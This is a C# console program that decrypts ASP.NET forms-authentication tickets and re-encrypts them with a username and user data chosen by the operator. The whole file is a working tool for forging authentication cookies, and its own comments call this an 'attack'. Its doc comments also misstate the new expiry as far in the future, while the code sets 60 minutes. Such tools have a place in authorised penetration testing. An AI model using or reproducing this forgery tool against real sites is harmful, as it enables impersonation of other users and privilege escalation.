using System;
using System.IO;
using System.Web;
using System.Web.Security;

namespace Recrypt;

/// <summary>
///     This class serves as a decryption oracle that decrypts an ASP.NET ticket and then lets the user change the username
///     and user data in said ticket.  When it recreates the ticket, it sets the expiry significantly into the future.
/// </summary>
internal static class Recrypt
{
    private static void Main(string[] args)
    {
        // Sometimes these are pretty large, so let's open things up to 8KB
        Console.SetIn(new StreamReader(Console.OpenStandardInput(), Console.InputEncoding, false,
            1024 * 8));

        string? userName = null;
        string? userData = null;
        FormsAuthenticationTicket? ticket = null;
        while (true)
            if (Not(GetTicket(out var decryptedTicket)))
            {
                GetNewData(out userName, out userData);
                if (ticket is not null) TicketRecrypter(ticket, userName, userData);
            }
            else
            {
                ticket = decryptedTicket;
                TicketRecrypter(ticket, userName, userData);
            }
    }

    /// <summary>
    ///     This method decrypts the ticket and returns the decrypted ticket.
    /// </summary>
    /// <param name="encryptedTicket">The encrypted ticket (either base64 or hex)</param>
    /// <param name="decryptedTicket">A nice, new decrypted version of the provided ticket</param>
    /// <returns><c>true</c> iff the ticket was decrypted</returns>
    private static bool DecryptTicket(string encryptedTicket, out FormsAuthenticationTicket? decryptedTicket)
    {
        try
        {
            decryptedTicket = FormsAuthentication.Decrypt(encryptedTicket);
            if (decryptedTicket is not null)
            {
                Console.WriteLine("The original ticket contains the following data:");
                Console.WriteLine($"Username: {decryptedTicket.Name}");
                Console.WriteLine($"User Data: {decryptedTicket.UserData}");
                Console.WriteLine($"Issue Date: {decryptedTicket.IssueDate}");
                Console.WriteLine($"Expiry: {decryptedTicket.Expiration}");
                Console.WriteLine($"Persistent?: {decryptedTicket.IsPersistent}");
                Console.WriteLine($"Path: {decryptedTicket.CookiePath}");
                Console.WriteLine($"Version: {decryptedTicket.Version}");
                return true;
            }

            Console.WriteLine("The decrypted ticket is null/empty... ignoring");
        }
        catch (ArgumentException)
        {
            Console.WriteLine(
                "Nope... that's not a valid ticket... like a poltroon, I shall flee from the battlefield");
            decryptedTicket = null;
        }
        catch (Exception e) when (e is HttpException or FormatException)
        {
            Console.WriteLine(
                $"{e.Message}... the craven Microsoft decrypter has failed us... or maybe it was YOU?  Perhaps try another string.");
            decryptedTicket = null;
        }

        return false;
    }

    /// <summary>
    ///     This method retrieves the user name and data that we want to push into the cookie.
    /// </summary>
    /// <param name="userName">The new user name</param>
    /// <param name="userData">The new user data</param>
    private static void GetNewData(out string? userName, out string? userData)
    {
        Console.Write("Please enter the desired username (or nothing if we keep the username): ");
        userName = Console.ReadLine();

        Console.Write("Please enter the desired user data (or nothing if we keep the user data): ");
        userData = Console.ReadLine();
    }

    /// <summary>
    ///     This method asks the user to provide us a .NET token (encrypted token).
    /// </summary>
    /// <param name="decryptedTicket">The user-provided .NET token, decrypted</param>
    /// <returns><c>true</c> iff the user wants us to decrypt the ticket</returns>
    private static bool GetTicket(out FormsAuthenticationTicket? decryptedTicket)
    {
        string? line;
        do
        {
            do
            {
                Console.Write(
                    "Please enter the string to recrypt (or 'q' to quit or 'o' to change the some of the other settings): ");
                line = Console.ReadLine();
            } while (string.IsNullOrEmpty(line));

            switch (line)
            {
                case "q":
                case "Q":
                    Console.WriteLine("Thank you for recrypting with us today");
                    Console.Write("Goodbye!");
                    Environment.Exit(0);
                    break;
                case "o":
                case "O":
                    decryptedTicket = null;
                    return false;
            }
        } while (Not(DecryptTicket(line, out decryptedTicket)));

        return true;
    }

    /// <summary>
    ///     This method negates its input and is designed to make visible negations so as to prevent bugs, especially on
    ///     maintenance.
    /// </summary>
    /// <param name="valueToNegate">The variable to negate</param>
    /// <returns>A boolean of opposite value from the one provided to the method</returns>
    /// <example>
    ///     <c>true</c>-&gt;<c>false</c>
    ///     <c>false</c>-&gt;<c>true</c>
    /// </example>
    private static bool Not(bool valueToNegate)
    {
        return !valueToNegate;
    }

    /// <summary>
    ///     This method decrypts the ticket and then "recrypts" it, replacing the username and user data, if appropriate, and
    ///     then changing the expiry to a long time from now.
    /// </summary>
    /// <param name="decryptedTicket">The ticket to use as the basis of our "attack"</param>
    /// <param name="username">The username to push into the token -- if empty, we just keep it what it was</param>
    /// <param name="userdata">The user data to push into the token -- if empty, we just keep it what it was</param>
    private static void TicketRecrypter(FormsAuthenticationTicket decryptedTicket, string? username, string? userdata)
    {
        if (string.IsNullOrWhiteSpace(username)) username = decryptedTicket.Name;

        if (string.IsNullOrWhiteSpace(userdata)) userdata = decryptedTicket.UserData;

        var ticket = new FormsAuthenticationTicket(1,
            username,
            DateTime.Now,
            DateTime.Now.AddMinutes(60),
            decryptedTicket.IsPersistent,
            userdata,
            "/");

        Console.WriteLine("The new ticket contains the following data:");
        Console.WriteLine($"Username: {ticket.Name}");
        Console.WriteLine($"User Data: {ticket.UserData}");
        Console.WriteLine($"Issue Date: {ticket.IssueDate}");
        Console.WriteLine($"Expiry: {ticket.Expiration}");
        Console.WriteLine($"Persistent?: {ticket.IsPersistent}");
        Console.WriteLine($"Path: {ticket.CookiePath}");
        Console.WriteLine($"Version: {ticket.Version}");

        Console.WriteLine();
        Console.WriteLine($"The new ticket is: {FormsAuthentication.Encrypt(ticket)}");
        Console.WriteLine();
    }
}